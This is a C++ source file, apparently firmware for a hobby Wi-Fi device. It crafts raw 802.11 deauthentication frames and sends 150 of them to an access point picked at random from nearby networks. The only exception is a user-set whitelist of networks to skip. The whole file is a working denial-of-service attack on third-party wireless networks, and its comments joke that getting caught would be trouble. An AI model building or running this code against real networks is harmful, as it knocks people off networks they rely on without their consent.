//////////////////////////////////////////////////
// deauth.cpp: handles the deauth of a local ap //
//////////////////////////////////////////////////

#include "deauth.h"

/*
* 
* the deauth packet is defined here.
* this is sent using the Raw80211 library.
* this is a raw frame/packet depending on where/how you refer to it in networking terms, i should specify or whatever...
* the variable deauthPacket is what used to be used for our deauthing, although now we rely on the contructor in the raw80211 library...
* much like the pwnagotchi, this project relies on one library/wrapper, specifically a library designed for raw frame sending
*
*/

void Deauth::construct(uint8_t* packetBuffer, const uint8_t* destinationMAC, const uint8_t* sourceMAC, const uint8_t* bssid, uint16_t sequenceNumber, uint16_t reasonCode) {

    /*
    * 
    * Top Ten Security Vulnerabilities in 2024!!111!!!1!
    * Number one: probably this code you're about to see...
    * 
    */
    
    // frame control
    packetBuffer[0] = 0xA0;
    packetBuffer[1] = 0x00;

    // duration
    packetBuffer[2] = 0x00;
    packetBuffer[3] = 0x00;

    // dest address
    memcpy(packetBuffer + 4, destinationMAC, 6);

    // source address
    memcpy(packetBuffer + 10, sourceMAC, 6);

    // BSSID
    memcpy(packetBuffer + 16, bssid, 6);

    // sequence number
    packetBuffer[22] = sequenceNumber & 0xFF;
    packetBuffer[23] = (sequenceNumber >> 8) & 0xFF;

    // reason
    packetBuffer[24] = reasonCode & 0xFF;
    packetBuffer[25] = (reasonCode >> 8) & 0xFF;
}

void Deauth::add(const char* bssid) {
    Serial.print("('-') Adding ");
    Serial.print(bssid);
    Serial.println(" to the whitelist");
    whitelist.push_back(bssid);
};

void Deauth::select() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        // retrieve BSSID from given AP
        const uint8_t* bssidPointer = WiFi.BSSID(randomIndex);
        memcpy(bssid, bssidPointer, 6);

        // check for AP in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
            Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
            return;
        }

        Serial.print("('-') Selected random AP: ");
        Serial.println(randomAP);
    } else {
        // well ur fucked.
        Serial.println("(;-;) No access points found.");
    }
}


void Deauth::deauth() {
    if (randomAP.length() > 0) {
        Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
        // define the attack
        if (!running) {
            start();
        } else {
            Serial.println("('-') Attack is already running.");
        }
    } else {
        // ok why did you modify the deauth function? i literally told you to not do that...
        Serial.println("(X-X) No access point selected. Use selectRandomAP() first.");
        Serial.println("('-') Told you so! (Please read my code comments)");
    }
};

void Deauth::start() {
    running = true;
    int packetSize = sizeof(deauthPacket);

    // construct the frame
    uint8_t* deauthPacket = new uint8_t[packetSize];
    construct(deauthPacket, destinationMAC, sourceMAC, bssid, sequenceNumber, reasonCode);

    // send the deauth 150 times(ur cooked if they find out)
    for (int i = 0; i < 150; ++i) {
        Raw80211::send(deauthPacket, packetSize);
        Serial.println("(>-<) Deauth packet sent!");
        delay(100);
    }

    // save memory by deleting frame
    delete[] deauthPacket;

    Serial.println("(^-^) Attack finished!");
    running = false;
};